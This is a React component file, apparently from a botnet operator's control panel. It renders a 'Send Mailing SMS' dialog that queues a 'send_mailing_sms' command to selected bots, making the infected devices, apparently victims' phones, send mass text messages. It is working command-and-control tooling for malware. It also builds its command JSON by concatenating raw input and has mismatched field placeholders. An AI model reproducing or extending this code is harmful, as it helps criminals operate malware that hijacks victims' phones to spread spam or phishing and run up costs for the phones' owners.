import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

class SendSMSMailing extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          phone: '',
          text: ''
        }
    }

    onChangePhone = (e) => {
        this.setState({ 
            phone: e.target.value
        });
    }

    onChangeText = (e) => {
        this.setState({ 
            text: e.target.value
        });
    }

    onClickSendSMS = (e) => {
        if(SettingsContext.BotsSelected()) {
            try_eval('$.notify("Added command [send_sms]", "info");');
            SettingsContext.BotSendCommand('{"cmd":"send_mailing_sms","n":"' + this.state.phone + '","t":"' + this.state.text + '"}');
            this.setState({ 
                phone: '',
                text: ''
            });
          
        }
    }

    render () {
        return (
            <React.Fragment>
              
                <div class="modal fade" id="modalSendSMSMailing" tabindex="-1" role="dialog" aria-labelledby="modalSendSMSMailing" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Send Mailing SMS</h5>

                            <div class="modal-body">
                                <input class="form-control" value={this.state.phone} onChange={this.onChangePhone} placeholder="Text: Hi my friend" />
                                <input class="form-control" value={this.state.text} onChange={this.onChangeText} placeholder="Limit: 20" />
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onClickSendSMS} class="btn btn-outline-primary"  data-dismiss="modal">Start</button>
                            </div>
                        </div>
                    </div>
                </div>

            </React.Fragment>
        );
    }
}

export default SendSMSMailing;